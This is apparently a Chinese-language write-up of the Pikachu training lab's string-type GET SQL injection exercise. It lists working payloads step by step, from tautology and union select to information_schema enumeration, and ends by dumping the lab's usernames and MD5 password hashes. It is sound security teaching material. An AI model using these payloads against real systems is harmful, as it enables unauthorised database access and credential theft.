---
title: Pikachu SQL注入 字符型注入（GET）Writeup
date: 2026-10-29
category: [Pikachu]
tags: [Pikachu, sql]
---
## 漏洞原理分析

后端原始SQL语句猜想：
SELECT uid,email FROM member WHERE username='$name';
$name 是前端GET传入的参数，被单引号包裹。
当我们传入单引号 '，会破坏原有引号结构，造成SQL语法报错，说明存在字符型注入。
区别数字型注入：数字型不需要单引号闭合；字符型必须用'闭合。
## 注入步骤
1. 注入点判断

Payload：
'
结果：页面返回SQL语法错误 You have an error in your SQL syntax
结论：参数name存在字符型SQL注入漏洞。

2. 测试闭合是否成功

Payload：
' or 1=1 #
SQL拼接后：
SELECT uid,email FROM member WHERE username='' or 1=1 #';
### 是MySQL注释符，注释掉后面多余的单引号；or 1=1 恒真，查询全部数据。
结果：页面返回所有用户数据，闭合成功。

3. order by 判断字段数量

Payload1：
' order by 2 #
结果：不报错，说明至少2列。

Payload2：
' order by 3 #
结果：报错 Unknown column '3' in 'order clause'
结论：查询回显列数为2。

4. 确认回显位置

Payload：
' and 1=2 union select 1,2 #
and 1=2 让原查询返回空，只展示union后面的内容。
结果：
your uid:1
your email is:2
结论：第1位在uid位置回显，第2位在email位置回显。

5. 查询当前数据库名

Payload：
' and 1=2 union select 1,database() #
结果：数据库名 pikachu

6. 查询库中所有数据表

Payload：
' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
结果：httpinfo,member,message,users,xssblind
目标表：member（存放账号密码）

7. 查询member表内字段

Payload：
' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='member' #
结果：id,username,pw,sex,phonenum,address,email
关键字段：username（用户名）、pw（密码，MD5加密）

8. 脱库，查询账号和密码

Payload：
' and 1=2 union select username,pw from member #
返回结果：
用户名 MD5加密密码 
vince e10adc3949ba59abbe56e057f20f883e 
allen e10adc3949ba59abbe56e057f20f883e 
kobe e10adc3949ba59abbe56e057f20f883e 
grady e10adc3949ba59abbe56e057f20f883e 
kevin e10adc3949ba59abbe56e057f20f883e 
lucy e10adc3949ba59abbe56e057f20f883e 
lili e10adc3949ba59abbe56e057f20f883e 

MD5密文 e10adc3949ba59abbe56e057f20f883e 解密结果：123456

## 漏洞危害

1. 攻击者可查询数据库全部数据，泄露账号、密码、手机号、邮箱等敏感信息；

2. 密码即使MD5加密，简单弱口令可快速解密；

3. 拓展可进一步提权、读取服务器文件、控制服务器。
